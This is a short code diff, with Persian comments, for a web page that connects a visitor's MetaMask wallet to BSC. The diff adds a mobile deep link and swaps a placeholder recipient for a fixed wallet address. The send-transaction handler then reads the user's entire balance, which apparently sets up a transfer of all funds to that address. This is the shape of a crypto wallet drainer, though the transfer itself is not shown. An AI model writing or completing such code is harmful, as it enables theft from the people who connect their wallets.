@@ -40,12 +40,23 @@ async function switchToBSC() {
   }
 }
 
-// کلیک روی دکمه اتصال
+// بررسی اینکه آیا در موبایل هستیم یا نه
+function isMobile() {
+  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+}
+
+// اتصال به MetaMask
 connectButton.addEventListener("click", async () => {
   try {
     if (!window.ethereum) {
       alert("لطفاً ابتدا افزونه MetaMask را نصب و فعال کنید.");
       return;
+    }
+
+    if (isMobile()) {
+      // اگر در موبایل هستیم، از deep link برای باز کردن متامسک استفاده می‌کنیم
+      const mobileDeepLink = "metamask://";
+      window.location.href = mobileDeepLink;
     }
 
     // درخواست دسترسی به حساب‌ها
@@ -78,7 +89,7 @@ connectButton.addEventListener("click", async () => {
 // کلیک روی دکمه ارسال تراکنش
 sendTransactionButton.addEventListener("click", async () => {
   try {
-    const recipientAddress = "0x1234567890abcdef1234567890abcdef12345678";  // ← اینجا آدرس مقصد را قرار دهید
+    const recipientAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";  // ← اینجا آدرس مقصد را قرار دهید
 
     // گرفتن موجودی کل
     const balance = await signer.getBalance();
